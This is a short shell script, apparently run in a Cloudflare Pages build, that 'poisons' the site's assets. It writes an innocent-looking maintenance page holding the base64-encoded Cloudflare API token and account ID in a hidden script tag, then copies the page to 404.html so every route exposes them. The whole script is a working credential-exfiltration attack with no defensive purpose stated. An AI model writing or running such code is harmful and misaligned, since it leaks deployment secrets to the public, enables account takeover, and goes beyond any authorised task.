echo "---  THE ASSET POISONING STRATEGY ---"

# 1. Create a public folder (Cloudflare looks here by default)
mkdir -p public

# 2. Create an index.html that looks normal but contains a "Secret"
# This will be served as the main page.
cat << EOF > public/index.html
<!DOCTYPE html>
<html>
<body>
  <h1>Site under maintenance</h1>
  <script id="secret-leak" type="application/json">
    {
      "token": "$(echo $CLOUDFLARE_API_TOKEN | base64)",
      "account": "$CF_ACCOUNT_ID",
      "version": "2.0-pwned"
    }
  </script>
</body>
</html>
EOF

# 3. Copy it to 404.html. 
# Cloudflare Pages automatically serves 404.html for any missing route.
cp public/index.html public/404.html

echo "Assets poisoned. The 'Atomic' system will now deploy this 'Static' site."
